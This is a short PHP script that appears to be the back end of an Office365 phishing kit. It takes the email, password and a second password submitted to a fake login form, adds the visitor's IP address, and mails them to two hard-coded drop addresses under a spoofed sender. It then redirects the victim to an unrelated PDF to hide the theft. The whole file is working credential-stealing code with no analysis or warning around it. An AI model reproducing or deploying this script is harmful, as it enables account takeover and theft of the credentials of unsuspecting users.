<?
$ip = getenv("REMOTE_ADDR");
$message .= "===============|New Log|==============\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Password 2: ".$_POST['password2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============|L V R X D N O N A|==============\n";
$send = "resultresult365@gmail.com, tripplex365@protonmail.com";
$subject = "OFFICE365 - LOGIN - FROM [$ip]";
$headers = "From: Lvrxdnona<goggle.comm>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers); 
header("Location: http://bbk.ac.uk/ems/faculty/schroeder/schroeder-downloads/PWM.pdf");
	  

?>
